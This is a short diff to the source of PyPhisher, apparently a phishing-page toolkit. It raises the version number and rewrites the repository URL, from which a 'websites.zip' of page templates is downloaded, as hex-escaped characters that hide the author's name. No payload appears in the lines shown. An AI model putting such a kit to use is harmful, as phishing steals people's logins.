@@ -1,7 +1,7 @@
 # -*- coding: UTF-8 -*-
 # ToolName   : PyPhisher
 # Author     : KasRoudra
-# Version    : 2.0
+# Version    : 2.1
 # License    : MIT
 # Copyright  : KasRoudra (2021-2022)
 # Github     : https://github.com/KasRoudra
@@ -215,7 +215,7 @@ cprint = Console().print
 # Get Columns of Screen
 columns = get_terminal_size().columns
 
-repo_url = "https://github.com/KasRoudra/PyPhisher"
+repo_url = "https://github.com/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61/PyPhisher"
 websites_url = f"{repo_url}/releases/download/v{version}/websites.zip" # "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" 
 
 # CF = Cloudflared, LX = LocalXpose, LHR = LocalHostRun
